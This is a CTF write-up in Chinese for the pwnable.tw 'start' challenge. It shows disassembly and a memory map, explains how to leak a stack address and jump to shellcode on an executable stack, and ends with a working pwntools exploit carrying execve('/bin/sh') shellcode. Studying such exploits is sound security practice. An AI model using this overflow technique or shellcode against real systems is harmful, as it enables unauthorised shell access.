# start

## ida

```assembly
push    esp
push    offset _exit
xor     eax, eax
xor     ebx, ebx
xor     ecx, ecx
xor     edx, edx
push    3A465443h
push    20656874h
push    20747261h
push    74732073h
push    2774654Ch
mov     ecx, esp        ; addr
mov     dl, 14h         ; len
mov     bl, 1           ; fd
mov     al, 4
int     80h             ; LINUX - sys_write
xor     ebx, ebx
mov     dl, 3Ch ; '<'
mov     al, 3
int     80h             ; LINUX - sys_read
add     esp, 14h
retn
pop     esp
xor     eax, eax
inc     eax
int     80h             ; LINUX - sys_exit
```

调试：

```shell
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
0x8048000  0x8049000 r-xp     1000 0      /home/niebelungen/Desktop/pwnable.tw/start/start
0xf7ff8000 0xf7ffc000 r--p     4000 0      [vvar]
0xf7ffc000 0xf7ffe000 r-xp     2000 0      [vdso]
0xfffdd000 0xffffe000 rwxp    21000 0      [stack]
```

没有足够的gadget让我们利用，正好stack有rwx权限，所以我们想办法在栈上写shellcode，再ret到那里。

首先我们要想办法leak栈的地址。

在`add esp,14h`后，`esp`指向了返回地址，下一条指令就是`pop esp`,而栈上保存的就是栈的地址。通过`ret`到`mov ecx,esp`调用`sys_write`可以leak栈地址。由此，再加上一个`offset`就可以到shellcode。

注意要写入的shellcode必须要短，0x3c-0x14-0x4=0x24。

## exp

```python
from pwn import *
from LibcSearcher import LibcSearcher
leak = lambda name,addr: log.success('{:#x}'.format(name,addr))
context.log_level="DEBUG"
#context.arch="amd64"

local=0
binary='./start'
#gdb.attach(p)
if local:
	p=process(binary)
else:
	p=remote('chall.pwnable.tw',10000)

elf = ELF(binary,checksec=False)
#gdb.attach(p)

shellcode='\x31\xc0\x31\xd2\x52\x68\x2f\x2f\x73\x68'
shellcode+='\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xb0\x0b\xcd\x80'#0x17
payload='a'*0x14+p32(0x8048087)
p.send(payload)
p.recvuntil("Let's start the CTF:")
stack=u32(p.recv(4))
print hex(stack)

payload='a'*0x14+p32(stack+20)+shellcode
p.send(payload)
p.interactive()
```

pwnable.tw真的不错。这个题考察了汇编基础、shellcode的编写。这里记录一个shellcode的网站：[shellcode](http://shell-storm.org/shellcode/)
